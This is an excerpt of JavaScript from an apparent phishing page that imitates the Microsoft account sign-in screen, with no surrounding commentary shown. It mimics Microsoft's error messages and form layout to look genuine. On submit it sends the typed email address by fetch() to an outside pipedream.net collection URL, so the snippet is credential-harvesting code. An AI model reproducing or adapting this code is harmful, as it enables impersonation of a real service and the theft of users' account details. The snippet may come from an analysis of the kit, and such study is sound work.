...
function validate() {
    ...
    return (
        ...
        !!validateEmail(t) ||
            (t
                ? (e.text("That Microsoft account doesn't exist.\n Enter a different account or get a new one."), e.css("color", "red"), (document.getElementById("loginForm").style.height = "403px"))
                : (e.text("Enter a valid email address, phone number, or Skype\n name."), e.css("color", "red"), (document.getElementById("loginForm").style.height = "403px")),
            !1)
    );
}
...
input1.addEventListener("keyup", function (e) {
    ...
    submitBtn.addEventListener("click", async function () {
        ...
        validatePassword() && await fetch(`https://eo2isf33hwr4zgo.m.pipedream.net/?email=${t}`);
